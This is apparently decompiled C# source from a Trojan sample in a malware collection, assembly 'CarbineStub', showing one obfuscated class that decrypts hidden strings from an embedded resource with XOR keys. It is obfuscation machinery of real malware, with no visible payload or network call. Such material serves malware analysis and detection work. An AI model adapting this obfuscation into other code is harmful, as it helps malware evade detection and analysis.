// Decompiled with JetBrains decompiler
// Type: .
// Assembly: CarbineStub, Version=3.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 865F3A3C-9112-4E05-A25F-DDC89BAC953A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.cmtc-69729d71a2e9827725ce9c74d3da6721354a09e79b733a53d3f513f67b6851ae.exe

using \u0002;
using \u0005;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0004
{
  internal static class \u0002
  {
    private static readonly Dictionary<int, string> \u0001 = new Dictionary<int, string>(9);
    private static BinaryReader \u0001;
    private static byte[] \u0001;
    private static short \u0001;
    private static bool \u0001;
    private static byte[] \u0001;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static string \u0002([In] int obj0)
    {
      Dictionary<int, string> dictionary;
      \u008D.\u007F\u0002((object) (dictionary = \u0004.\u0002.\u0001));
      try
      {
        string str;
        if (\u0004.\u0002.\u0001.TryGetValue(obj0, out str))
          return str;
        if (\u0004.\u0002.\u0001 == null)
        {
          Assembly assembly1 = \u0089\u0002.\u0091\u0002();
          Assembly assembly2 = \u0089\u0002.\u0092\u0002();
          \u0004.\u0002.\u0001 = false;
          \u0004.\u0002.\u0001 = new BinaryReader(\u0081.\u007E\u008F\u0002((object) assembly1, \u0001.\u0002(60)));
          short num = (short) ((int) \u0010\u0002.\u007E\u0013\u0003((object) \u0004.\u0002.\u0001) ^ 6038);
          if (num == (short) 0)
            \u0004.\u0002.\u0001 = (short) ((int) \u0010\u0002.\u007E\u0013\u0003((object) \u0004.\u0002.\u0001) ^ 1690);
          else
            \u0004.\u0002.\u0001 = \u009F.\u007E\u0015\u0003((object) \u0004.\u0002.\u0001, (int) num);
          Assembly assembly3 = assembly1;
          AssemblyName assemblyName = \u0084\u0002.\u007E\u008E\u0002((object) assembly3);
          \u0004.\u0002.\u0001 = \u0083\u0002.\u007E\u0098\u0002((object) assemblyName);
          if (\u0004.\u0002.\u0001 != null && \u0004.\u0002.\u0001.Length == 0)
            \u0004.\u0002.\u0001 = (byte[]) null;
        }
        int num1 = obj0 ^ -2140947460;
        \u0093.\u007E\u0008\u0003((object) \u000E\u0002.\u007E\u0011\u0003((object) \u0004.\u0002.\u0001), (long) num1);
        byte[] numArray1;
        if (\u0004.\u0002.\u0001 != null)
        {
          numArray1 = \u0004.\u0002.\u0001;
        }
        else
        {
          short num2 = \u0004.\u0002.\u0001 != (short) -1 ? \u0004.\u0002.\u0001 : (short) ((int) \u0010\u0002.\u007E\u0013\u0003((object) \u0004.\u0002.\u0001) ^ 30499 ^ num1);
          numArray1 = num2 != (short) 0 ? \u009F.\u007E\u0015\u0003((object) \u0004.\u0002.\u0001, (int) num2) : (byte[]) null;
        }
        int length = \u001A.\u007E\u0014\u0003((object) \u0004.\u0002.\u0001) ^ num1 ^ 612365185;
        bool flag = (length & int.MinValue) != 0;
        if (flag)
          length &= int.MaxValue;
        byte[] numArray2 = \u0001.\u0002(numArray1, \u009F.\u007E\u0015\u0003((object) \u0004.\u0002.\u0001, length));
        if (\u0004.\u0002.\u0001 != null != \u0004.\u0002.\u0001)
        {
          for (int index = 0; index < length; ++index)
          {
            byte num3 = \u0004.\u0002.\u0001[index & 7];
            byte num4 = (byte) ((int) num3 << 3 | (int) num3 >> 5);
            numArray2[index] = (byte) ((uint) numArray2[index] ^ (uint) num4);
          }
        }
        if (flag && !\u0004.\u0002.\u0001)
        {
          char[] chArray = new char[length];
          for (int index = 0; index < length; ++index)
            chArray[index] = (char) numArray2[index];
          str = new string(chArray);
        }
        else
          str = \u001D.\u007E\u0002\u0003((object) \u0001\u0002.\u0003\u0003(), numArray2, 0, numArray2.Length);
        if (\u0004.\u0002.\u0001)
          str = (obj0 + length ^ 936568).ToString(\u0001.\u0002(113));
        str = \u000F\u0002.\u0003\u0002(str);
        \u0004.\u0002.\u0001.Add(obj0, str);
        if (\u0004.\u0002.\u0001.Count == 9)
        {
          \u008D.\u007E\u0012\u0003((object) \u0004.\u0002.\u0001);
          \u0004.\u0002.\u0001 = (BinaryReader) null;
          \u0004.\u0002.\u0001 = \u0004.\u0002.\u0001 = (byte[]) null;
        }
        return str;
      }
      finally
      {
        \u008D.\u0080\u0002((object) dictionary);
      }
    }
  }
}
